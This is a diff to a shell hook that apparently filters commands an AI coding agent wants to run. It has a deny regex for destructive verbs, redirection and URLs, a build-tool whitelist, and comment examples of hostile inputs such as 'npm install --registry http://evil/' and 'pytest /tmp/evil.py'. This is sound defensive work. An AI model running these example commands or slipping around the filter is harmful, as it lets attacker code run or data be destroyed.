@@ -31,8 +31,10 @@ cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null)
 #   argument that is an absolute path (/...), home path (~/...) or parent traversal (../) —
 #   these are how a whitelisted tool gets pointed at attacker-controlled files/registries
 #   (e.g. `jest --globalSetup=/tmp/evil.js`, `pytest /tmp/evil.py`, `make -f /tmp/evil.mk`,
-#   `npm install --registry http://evil/`). Destructive verbs denied last.
-deny='>>|[<>`&]|\$\(|\|\||(https?|ftp|file)://|(^|[=[:space:]])(/|~/|\.\./)|(^|[^[:alnum:]_])(rm|rmdir|mv|cp|sudo|chmod|chown|kill|taskkill|dd|mkfs|del|format|truncate|tee|ln)([^[:alnum:]_]|$)'
+#   `npm install --registry http://evil/`). Destructive verbs denied last; their
+#   left boundary excludes '-' so a flag like `-cp` / `-Dx=-cp` is not read as the
+#   `cp` command (a real cp still needs a start/space/;/| boundary → still denied).
+deny='>>|[<>`&]|\$\(|\|\||(https?|ftp|file)://|(^|[=[:space:]])(/|~/|\.\./)|(^|[^-[:alnum:]_])(rm|rmdir|mv|cp|sudo|chmod|chown|kill|taskkill|dd|mkfs|del|format|truncate|tee|ln)([^[:alnum:]_]|$)'
 if printf '%s' "$cmd" | grep -Eq "$deny"; then exit 0; fi
 
 # main verb whitelist (segment 1 must match one of these patterns from its start).
@@ -40,11 +42,25 @@ if printf '%s' "$cmd" | grep -Eq "$deny"; then exit 0; fi
 # — there is NO bare `yarn <anything>` branch (that let `yarn exec sh` / `yarn dlx <evil>`
 # through).
 is_main() {
-  printf '%s' "$1" | grep -Eq '^[[:space:]]*(mvn([[:space:]]+-[^[:space:]]+)*[[:space:]]+(compile|test-compile|verify|test)([[:space:]]|$)|(gradle|\./gradlew)[[:space:]]+(build|assemble|test)|tsc([[:space:]]+--noEmit)?([[:space:]]|$)|(npm|pnpm|yarn)[[:space:]]+(run[[:space:]]+build|test|install|ci)([[:space:]]|$)|vite[[:space:]]+build|go[[:space:]]+(build|vet|test|get)([[:space:]]|$)|go[[:space:]]+mod[[:space:]]+(download|tidy)|cargo[[:space:]]+(build|check|test|fetch)([[:space:]]|$)|make([[:space:]]|$)|dotnet[[:space:]]+(build|test|restore)|(jest|vitest|mocha|playwright|cypress|pytest|mypy)([[:space:]]|$)|(python|python3)[[:space:]]+-m[[:space:]]+pytest|eslint([[:space:]]|$)|prettier[[:space:]]+--check|ruff[[:space:]]+check|gofmt[[:space:]]+-l|(pip|pip3)[[:space:]]+install|poetry[[:space:]]+install|pipenv[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|bundle[[:space:]]+install|composer[[:space:]]+install)'
+  printf '%s' "$1" | grep -Eq '^[[:space:]]*((mvn|\./mvnw)([[:space:]]+-[^[:space:]]+)*[[:space:]]+(compile|test-compile|verify|test)([[:space:]]|$)|(gradle|\./gradlew)[[:space:]]+(build|assemble|test)|tsc([[:space:]]+--noEmit)?([[:space:]]|$)|(npm|pnpm|yarn)[[:space:]]+(run[[:space:]]+build|test|install|ci)([[:space:]]|$)|vite[[:space:]]+build|go[[:space:]]+(build|vet|test|get)([[:space:]]|$)|go[[:space:]]+mod[[:space:]]+(download|tidy)|cargo[[:space:]]+(build|check|test|fetch)([[:space:]]|$)|make([[:space:]]|$)|dotnet[[:space:]]+(build|test|restore)|(jest|vitest|mocha|playwright|cypress|pytest|mypy)([[:space:]]|$)|(python|python3)[[:space:]]+-m[[:space:]]+pytest|eslint([[:space:]]|$)|prettier[[:space:]]+--check|ruff[[:space:]]+check|gofmt[[:space:]]+-l|(pip|pip3)[[:space:]]+install|poetry[[:space:]]+install|pipenv[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|bundle[[:space:]]+install|composer[[:space:]]+install)'
 }
 
-# split on | and ; (the only combinators left after hard-deny); validate each segment.
-segs=$(printf '%s' "$cmd" | tr '|;' '\n\n')
+# split on | and ; that are OUTSIDE quotes (quoted ones are literal args, not
+# combinators — a plain `tr` would wrongly split e.g. -Dtest='Foo;Bar'). awk walks
+# char-by-char tracking quote state; sq/dq passed via -v for portable quote chars.
+segs=$(printf '%s' "$cmd" | awk -v sq="'" -v dq='"' '
+{
+  res=""; inq=0; qc="";
+  n=length($0);
+  for (i=1;i<=n;i++) {
+    c=substr($0,i,1);
+    if (inq)                 { res=res c; if (c==qc) inq=0 }
+    else if (c==sq||c==dq)   { inq=1; qc=c; res=res c }
+    else if (c=="|"||c==";") { res=res "\n" }
+    else                     { res=res c }
+  }
+  print res
+}')
 i=0; ok=1
 while IFS= read -r seg; do
   seg=$(printf '%s' "$seg" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
